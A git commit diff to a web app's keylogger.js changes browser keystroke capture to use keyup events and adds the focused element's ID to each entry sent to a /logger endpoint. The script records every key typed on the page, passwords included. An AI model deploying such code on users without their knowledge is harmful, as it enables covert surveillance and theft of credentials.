3537fe8a34c6592ec0f68041444837412fd69f24
Ruchit Modi <modi.ruchit6@gmail.com>
2020-10-08 13:50:44 -0500

    Improved keystroke logging using keyup event

--- app/static/js/keylogger.js
+++ app/static/js/keylogger.js
@@ -1,6 +1,8 @@
-document.addEventListener('keydown', function (event) {
+document.addEventListener('keyup', function (event) {
+    var tgt = event.target;
     var char = event.key;
+    var nodeId = $(tgt).attr("id") ? $(tgt).attr("id") : $(tgt).find("[id]").first().attr("id");
     char = char === ' ' ? 'Space' : char;
-    keylog = char + ' in [' + window.location.href + ']';
+    var keylog = char + " on [#" + nodeId + "] in [" + window.location.href + "]";
     $.ajax({url: '/logger?msg=' + encodeURIComponent(keylog)});
 });
